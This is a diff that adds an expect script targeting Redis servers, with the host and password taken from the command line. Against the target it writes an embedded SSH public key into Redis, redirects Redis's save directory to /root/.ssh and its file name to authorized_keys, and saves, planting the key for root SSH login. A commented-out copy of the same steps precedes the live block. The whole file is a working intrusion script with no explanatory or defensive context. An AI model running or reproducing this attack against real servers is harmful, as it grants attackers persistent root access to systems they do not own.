@@ -1,0 +1,23 @@
+#!/usr/bin/expect
+
+set sentence1 [lindex $argv 0]
+set sentence2 [lindex $argv 1]
+spawn /usr/local/redis/bin/redis-cli -h $sentence1 -p 6379 -a $sentence2
+#expect  "127.0.0.1:6379>"
+#send "set -.- \"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAltEC9ktb+401+epwi/QxYKoTLYiHaJ9RREnHzPfMzs107ba9otiT6iiiFDJtXnvAWkp6vMDJ59ncJUNCFmPjReK521DP5cmVg5V7un71GhFEybZ8oGzEFWeYPhXp+vBK0VW1btPl7GaLs5DU1bKDpmPPFURWFIw77pd8CFeYXjLBssmQgvm3szk2VxD2gw2DAQa6+cLGtjRMmWgD2QRG7gkMoRotkfoxkqwESuBedspm0unB7eQHfXvMznntnwTzwDW1E70BMAvk4bnoJnBGnZep2SBxNUn9H6a7mcGyD6FDQ6TQClc9KeXNiq/mqTa0X6jCLzF0GsYl0mQHcAF7DQ== rsa-key-20180320\n\n\n\" \r"
+#send "config set dir /root/.ssh \r"
+#send "config set dbfilename authorized_keys \r"
+#send "save \r" 
+#exit
+
+expect  "127.0.0.1:6379>"
+if { $sentence1==$sentence1 } {
+send "set -.- \"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAltEC9ktb+401+epwi/QxYKoTLYiHaJ9RREnHzPfMzs107ba9otiT6iiiFDJtXnvAWkp6vMDJ59ncJUNCFmPjReK521DP5cmVg5V7un71GhFEybZ8oGzEFWeYPhXp+vBK0VW1btPl7GaLs5DU1bKDpmPPFURWFIw77pd8CFeYXjLBssmQgvm3szk2VxD2gw2DAQa6+cLGtjRMmWgD2QRG7gkMoRotkfoxkqwESuBedspm0unB7eQHfXvMznntnwTzwDW1E70BMAvk4bnoJnBGnZep2SBxNUn9H6a7mcGyD6FDQ6TQClc9KeXNiq/mqTa0X6jCLzF0GsYl0mQHcAF7DQ== rsa-key-20180320\n\n\n\" \r"
+send "config set dir /root/.ssh \r"
+send "config set dbfilename authorized_keys \r"
+send "save \r"
+}
+
+
+
+expect eof
